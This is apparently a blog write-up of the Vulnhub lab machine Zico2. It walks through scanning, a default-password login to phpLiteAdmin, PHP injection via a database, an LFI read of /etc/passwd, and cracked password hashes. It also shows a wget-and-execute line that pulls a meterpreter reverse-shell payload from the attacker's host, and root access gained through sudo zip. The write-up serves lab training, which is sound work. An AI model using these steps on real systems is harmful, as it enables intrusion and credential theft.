---
layout:     post
title:      "Vulnhub.com - Zico2"
date:       2018-08-14 0:00:00
author:     "W3ndige"
permalink: /:title/
category: Vulnhub
---

In this post we're going to finish a quick machine from Vulnhub called **Zico2**.

{% highlight text %}
Zico's Shop: A Boot2Root Machine intended to simulate a real world cenario

Disclaimer:

By using this virtual machine, you agree that in no event will I be liable for any loss or damage including without limitation, indirect or consequential loss or damage, or any loss or damage whatsoever arising from loss of data or profits arising out of or in connection with the use of this software.

TL;DR - You are about to load up a virtual machine with vulnerabilities. If something bad happens, it's not my fault.

Level: Intermediate

Goal: Get root and read the flag file

Description:

Zico is trying to build his website but is having some trouble in choosing what CMS to use. After some tries on a few popular ones, he decided to build his own. Was that a good idea?

Hint: Enumerate, enumerate, and enumerate!

Thanks to: VulnHub

Author: Rafael (@rafasantos5)

Doesn't work with VMware. Virtualbox only. 
{% endhighlight %}

* Author: [rafasantos5](https://twitter.com/@rafasantos5)
* Download: [https://www.vulnhub.com/entry/zico2-1,210/](https://www.vulnhub.com/entry/zico2-1,210/)

### Solution

As always, let's start from the usual `nmap` scan. 

{% highlight text %}
root@kali:~# nmap -v -sS -A -T4 10.0.0.8
Starting Nmap 7.70 ( https://nmap.org ) at 2018-07-18 09:12 EDT
NSE: Loaded 148 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 09:12
Completed NSE at 09:12, 0.00s elapsed
Initiating NSE at 09:12
Completed NSE at 09:12, 0.00s elapsed
Initiating ARP Ping Scan at 09:12
Scanning 10.0.0.8 [1 port]
Completed ARP Ping Scan at 09:12, 0.04s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 09:12
Completed Parallel DNS resolution of 1 host. at 09:12, 0.00s elapsed
Initiating SYN Stealth Scan at 09:12
Scanning 10.0.0.8 [1000 ports]
Discovered open port 111/tcp on 10.0.0.8
Discovered open port 22/tcp on 10.0.0.8
Discovered open port 80/tcp on 10.0.0.8
Completed SYN Stealth Scan at 09:12, 0.08s elapsed (1000 total ports)
Initiating Service scan at 09:12
Scanning 3 services on 10.0.0.8
Completed Service scan at 09:12, 6.08s elapsed (3 services on 1 host)
Initiating OS detection (try #1) against 10.0.0.8
NSE: Script scanning 10.0.0.8.
Initiating NSE at 09:12
Completed NSE at 09:12, 0.25s elapsed
Initiating NSE at 09:12
Completed NSE at 09:12, 0.01s elapsed
Nmap scan report for 10.0.0.8
Host is up (0.00071s latency).
Not shown: 997 closed ports
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 68:60:de:c2:2b:c6:16:d8:5b:88:be:e3:cc:a1:25:75 (DSA)
|   2048 50:db:75:ba:11:2f:43:c9:ab:14:40:6d:7f:a1:ee:e3 (RSA)
|_  256 11:5d:55:29:8a:77:d8:08:b4:00:9b:a3:61:93:fe:e5 (ECDSA)
80/tcp  open  http    Apache httpd 2.2.22 ((Ubuntu))
| http-methods: 
|_  Supported Methods: POST OPTIONS GET HEAD
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_http-title: Zico's Shop
111/tcp open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version   port/proto  service
|   100000  2,3,4        111/tcp  rpcbind
|   100000  2,3,4        111/udp  rpcbind
|   100024  1          40448/udp  status
|_  100024  1          48227/tcp  status
MAC Address: 08:00:27:98:69:CA (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 2.6.X|3.X
OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3
OS details: Linux 2.6.32 - 3.5
Uptime guess: 199.638 days (since Sat Dec 30 16:53:24 2017)
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=259 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.71 ms 10.0.0.8

NSE: Script Post-scanning.
Initiating NSE at 09:12
Completed NSE at 09:12, 0.00s elapsed
Initiating NSE at 09:12
Completed NSE at 09:12, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.36 seconds
           Raw packets sent: 1020 (45.626KB) | Rcvd: 1016 (41.350KB)
{% endhighlight %}

From the results, we can see three open ports - `ssh`, `http` and `rpcbind`. With that information we can continue enumeration on port `80` and scan the website hosted on this machine. 

{% highlight text %}
root@kali:~# dirb http://10.0.0.8

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Wed Jul 18 09:13:22 2018
URL_BASE: http://10.0.0.8/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://10.0.0.8/ ----
+ http://10.0.0.8/cgi-bin/ (CODE:403|SIZE:284)                                 
==> DIRECTORY: http://10.0.0.8/css/                                            
==> DIRECTORY: http://10.0.0.8/dbadmin/                                        
==> DIRECTORY: http://10.0.0.8/img/                                            
+ http://10.0.0.8/index (CODE:200|SIZE:7970)                                   
+ http://10.0.0.8/index.html (CODE:200|SIZE:7970)                              
==> DIRECTORY: http://10.0.0.8/js/                                             
+ http://10.0.0.8/LICENSE (CODE:200|SIZE:1094)                                 
+ http://10.0.0.8/package (CODE:200|SIZE:789)                                  
+ http://10.0.0.8/server-status (CODE:403|SIZE:289)                            
+ http://10.0.0.8/tools (CODE:200|SIZE:8355)                                   
==> DIRECTORY: http://10.0.0.8/vendor/                                         
+ http://10.0.0.8/view (CODE:200|SIZE:0)                                       
                                                                               
---- Entering directory: http://10.0.0.8/css/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
---- Entering directory: http://10.0.0.8/dbadmin/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
---- Entering directory: http://10.0.0.8/img/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
---- Entering directory: http://10.0.0.8/js/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
---- Entering directory: http://10.0.0.8/vendor/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
-----------------
END_TIME: Wed Jul 18 09:13:27 2018
DOWNLOADED: 4612 - FOUND: 8
{% endhighlight %}

Scanning with `dirb` shows interesting directory `dbadmin`, let's take a look at it. 

![Dbadmin](/img/zico2/dbadmin.png){:class="img-responsive center-block"}

Googling for the name of the service `phpLiteAdmin v1.9.3` returned a [default password](https://www.acunetix.com/vulnerabilities/web/phpliteadmin-default-password
), with which we can log into the panel.

While looking for information, I've noticed a table containg hashes of users.

{% highlight text %}
http://10.0.0.8/dbadmin/test_db.php?action=row_view&table=info

edit	delete	root	653F4B285089453FE00E2AAFAC573414	1
edit	delete	zico	96781A607F4E9F5F423AC01F0DAB0EBD	2
{% endhighlight %}

Being able to crack them, I decided to connect to `ssh`, but with no luck.

{% highlight text %}
zico 96781A607F4E9F5F423AC01F0DAB0EBD	md5	zico2215@
root 653F4B285089453FE00E2AAFAC573414	md5	34kroot34
{% endhighlight %}

Moving on with attack, we can use this [exploit](https://www.exploit-db.com/exploits/24044/
) in order to execute commands. Steps are simple.

1. We create a db named "share.php".
2. Now create a new table in this database and insert a text field with the default value:
`<?php echo(system("whoami"))?>`

In addition, in `view.php` we have a LFI vulnerability allowing us to view any file in the system. 

{% highlight text %}

http://10.0.0.8/view.php?page=../../../../../../etc/passwd

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
syslog:x:101:103::/home/syslog:/bin/false
messagebus:x:102:105::/var/run/dbus:/bin/false
ntp:x:103:108::/home/ntp:/bin/false
sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin
vboxadd:x:999:1::/var/run/vboxadd:/bin/false
statd:x:105:65534::/var/lib/nfs:/bin/false
mysql:x:106:112:MySQL Server,,,:/nonexistent:/bin/false
zico:x:1000:1000:,,,:/home/zico:/bin/bash
{% endhighlight %}

Now let's see if our code has executed.

{% highlight text %}
http://10.0.0.8/view.php?page=../../../usr/databases/share.php
SQLite format 3@ -â! ››c)tabletesttestCREATE TABLE 'test' ('text' INTEGER default 'www-data www-data') 
{% endhighlight %}

It's working! Now we can see if `nc` is installed in order to execute a reverse shell. 

{% highlight text %}
<?php echo(system("which nc"))?>
SQLite format 3@  -â! áa%tabletesttestCREATE TABLE 'test' ('test' TEXT default '/bin/nc /bin/nc') 
{% endhighlight %}

And as it's installed, let's prepare the reverse tcp shell. 

{% highlight text %}
root@kali:~# msfvenom --platform Linux -p linux/x64/meterpreter_reverse_tcp LHOST=10.0.0.4 LPORT=1337 -f elf -o exploit
[-] No arch selected, selecting arch: x64 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 911184 bytes
Final size of elf file: 911184 bytes
Saved as: exploit
root@kali:~# python -m SimpleHTTPServer 
Serving HTTP on 0.0.0.0 port 8000 ...
{% endhighlight %}

Now we simply have to get it from our Kali machine and execute it. 

{% highlight text %}
<?php system("cd /tmp;wget 10.0.0.4:8000/exploit; chmod +x exploit; ./exploit"); ?>
{% endhighlight %}

Viewing this website just the same way as previously got us a reverse shell. 

{% highlight text %}
root@kali:~# msfconsole
                                                  \../
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%     %%%         %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%  %%  %%%%%%%%   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%  %  %%%%%%%%   %%%%%%%%%%% https://metasploit.com %%%%%%%%%%%%%%%%%%%%%%%%
%%  %%  %%%%%%   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%  %%%%%%%%%   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%%  %%%  %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%    %%   %%%%%%%%%%%  %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%  %%%  %%%%%
%%%%  %%  %%  %      %%      %%    %%%%%      %    %%%%  %%   %%%%%%       %%
%%%%  %%  %%  %  %%% %%%%  %%%%  %%  %%%%  %%%%  %% %%  %% %%% %%  %%%  %%%%%
%%%%  %%%%%%  %%   %%%%%%   %%%%  %%%  %%%%  %%    %%  %%% %%% %%   %%  %%%%%
%%%%%%%%%%%% %%%%     %%%%%    %%  %%   %    %%  %%%%  %%%%   %%%   %%%     %
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%  %%%%%%% %%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%          %%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%


       =[ metasploit v4.16.65-dev                         ]
+ -- --=[ 1780 exploits - 1016 auxiliary - 308 post       ]
+ -- --=[ 538 payloads - 41 encoders - 10 nops            ]
+ -- --=[ Free Metasploit Pro trial: http://r-7.co/trymsp ]

msf > use multi/handler
semsf exploit(multi/handler) > set LPORT 1337
LPORT => 1337
msf exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.0.0.4:1337 
[*] Sending stage (179779 bytes) to 10.0.0.8
[*] Meterpreter session 3 opened (10.0.0.4:1337 -> 10.0.0.8:54453) at 2018-07-18 11:49:29 -0400

meterpreter > shell
Process 1396 created.
Channel 1 created.
cd /
python -c 'import pty;pty.spawn("/bin/bash")'
{% endhighlight %}

Now we just have to escalate to another user. I decided to firstly, check out the home directory, which will show what other users are on the system. 

{% highlight text %}
www-data@zico:/$ cd /home
cd /home
www-data@zico:/home$ ls -la
ls -la
total 12
drwxr-xr-x  3 root root 4096 Jun  8  2017 .
drwxr-xr-x 24 root root 4096 Jun  1  2017 ..
drwxr-xr-x  6 zico zico 4096 Jun 19  2017 zico
www-data@zico:/home$ cd zico
cd zico
www-data@zico:/home/zico$ ls -la
ls -la
total 9244
drwxr-xr-x  6 zico zico    4096 Jun 19  2017 .
drwxr-xr-x  3 root root    4096 Jun  8  2017 ..
-rw-------  1 zico zico     912 Jun 19  2017 .bash_history
-rw-r--r--  1 zico zico     220 Jun  8  2017 .bash_logout
-rw-r--r--  1 zico zico    3486 Jun  8  2017 .bashrc
-rw-r--r--  1 zico zico     675 Jun  8  2017 .profile
drw-------  2 zico zico    4096 Jun  8  2017 .ssh
-rw-------  1 zico zico    3509 Jun 19  2017 .viminfo
-rw-rw-r--  1 zico zico  504646 Jun 14  2017 bootstrap.zip
drwxrwxr-x 18 zico zico    4096 Jun 19  2017 joomla
drwxrwxr-x  6 zico zico    4096 Aug 19  2016 startbootstrap-business-casual-gh-pages
-rw-rw-r--  1 zico zico      61 Jun 19  2017 to_do.txt
drwxr-xr-x  5 zico zico    4096 Jun 19  2017 wordpress
-rw-rw-r--  1 zico zico 8901913 Jun 19  2017 wordpress-4.8.zip
-rw-rw-r--  1 zico zico    1194 Jun  8  2017 zico-history.tar.gz
{% endhighlight %}

That's a lot of files to look at. Let's start with `to_do.txt`. 

{% highlight text %}
www-data@zico:/home/zico$ cat to_do.txt
cat to_do.txt

try list:
- joomla
- bootstrap (+phpliteadmin)
- wordpress
{% endhighlight %}

So `zico` user tried different CMSs. We can check what's inside this directories, starting from Wordpress as it's the one that I'm most familiar. 

{% highlight text %}
www-data@zico:/home/zico$ cd wordpress
cd wordpress
www-data@zico:/home/zico/wordpress$ cat wp-config.php
cat wp-config.php
<?php
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the
 * installation. You don't have to use the web site, you can
 * copy this file to "wp-config.php" and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * MySQL settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://codex.wordpress.org/Editing_wp-config.php
 *
 * @package WordPress
 */

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'zico');

/** MySQL database username */
define('DB_USER', 'zico');

/** MySQL database password */
define('DB_PASSWORD', 'sWfCsfJSPV9H3AmQzw8');

/** MySQL hostname */
define('DB_HOST', 'zico');

/** Database Charset to use in creating database tables. */
define('DB_CHARSET', 'utf8');

/** The Database Collate type. Don't change this if in doubt. */
define('DB_COLLATE', '');

/**#@+
 * Authentication Unique Keys and Salts.
 *
 * Change these to different unique phrases!
 * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
 * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define('AUTH_KEY',         'put your unique phrase here');
define('SECURE_AUTH_KEY',  'put your unique phrase here');
define('LOGGED_IN_KEY',    'put your unique phrase here');
define('NONCE_KEY',        'put your unique phrase here');
define('AUTH_SALT',        'put your unique phrase here');
define('SECURE_AUTH_SALT', 'put your unique phrase here');
define('LOGGED_IN_SALT',   'put your unique phrase here');
define('NONCE_SALT',       'put your unique phrase here');

/**#@-*/

/**
 * WordPress Database Table prefix.
 *
 * You can have multiple installations in one database if you give each
 * a unique prefix. Only numbers, letters, and underscores please!
 */
$table_prefix  = 'wp_';

/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 *
 * For information on other constants that can be used for debugging,
 * visit the Codex.
 *
 * @link https://codex.wordpress.org/Debugging_in_WordPress
 */
define('WP_DEBUG', false);

/* That's all, stop editing! Happy blogging. */

/** Absolute path to the WordPress directory. */
if ( !defined('ABSPATH') )
	define('ABSPATH', dirname(__FILE__) . '/');

/** Sets up WordPress vars and included files. */
require_once(ABSPATH . 'wp-settings.php');
{% endhighlight %}

We have a password to the database. With that, we can try to log in to `ssh` server. 

{% highlight text %}
root@kali:~# ssh zico@10.0.0.8
zico@10.0.0.8's password: 

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

zico@zico:~$ ls -la
total 9248
drwxr-xr-x  7 zico zico    4096 Jul 18 15:59 .
drwxr-xr-x  3 root root    4096 Jun  8  2017 ..
-rw-------  1 zico zico     912 Jun 19  2017 .bash_history
-rw-r--r--  1 zico zico     220 Jun  8  2017 .bash_logout
-rw-r--r--  1 zico zico    3486 Jun  8  2017 .bashrc
-rw-rw-r--  1 zico zico  504646 Jun 14  2017 bootstrap.zip
drwx------  2 zico zico    4096 Jul 18 15:59 .cache
drwxrwxr-x 18 zico zico    4096 Jun 19  2017 joomla
-rw-r--r--  1 zico zico     675 Jun  8  2017 .profile
drw-------  2 zico zico    4096 Jun  8  2017 .ssh
drwxrwxr-x  6 zico zico    4096 Aug 19  2016 startbootstrap-business-casual-gh-pages
-rw-rw-r--  1 zico zico      61 Jun 19  2017 to_do.txt
-rw-------  1 zico zico    3509 Jun 19  2017 .viminfo
drwxr-xr-x  5 zico zico    4096 Jun 19  2017 wordpress
-rw-rw-r--  1 zico zico 8901913 Jun 19  2017 wordpress-4.8.zip
-rw-rw-r--  1 zico zico    1194 Jun  8  2017 zico-history.tar.gz
{% endhighlight %}

And after checking what commands user is able to execute with `sudo`, both `tar` and `zip` commands are available. 

{% highlight text %}
zico@zico:~$ sudo -l
Matching Defaults entries for zico on this host:
    env_reset, exempt_group=admin,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User zico may run the following commands on this host:
    (root) NOPASSWD: /bin/tar
    (root) NOPASSWD: /usr/bin/zip
{% endhighlight %}

Doing another bit of searching I've noticed a cool way to execute commands with `tar`. Check it out [here](https://www.securusglobal.com/community/2014/05/14/solutions-to-the-sudo-challenge/S
). 

{% highlight text %}
zico@zico:~$ sudo zip test.zip to_do.txt -T -TT 'sh -c /bin/bash'
  adding: to_do.txt (deflated 2%)
root@zico:~# cd /root
root@zico:/root# ls -la
total 44
drwx------  4 root root 4096 Jun 19  2017 .
drwxr-xr-x 24 root root 4096 Jun  1  2017 ..
-rw-------  1 root root 5723 Jun 19  2017 .bash_history
-rw-r--r--  1 root root 3106 Apr 19  2012 .bashrc
drwx------  2 root root 4096 Jun  1  2017 .cache
-rw-r--r--  1 root root   75 Jun 19  2017 flag.txt
-rw-r--r--  1 root root  140 Apr 19  2012 .profile
drwxr-xr-x  2 root root 4096 Jun  8  2017 .vim
-rw-------  1 root root 5963 Jun 19  2017 .viminfo
root@zico:/root# cat flag.txt
#
#
#
# ROOOOT!
# You did it! Congratz!
# 
# Hope you enjoyed! 
# 
# 
#
#
{% endhighlight %}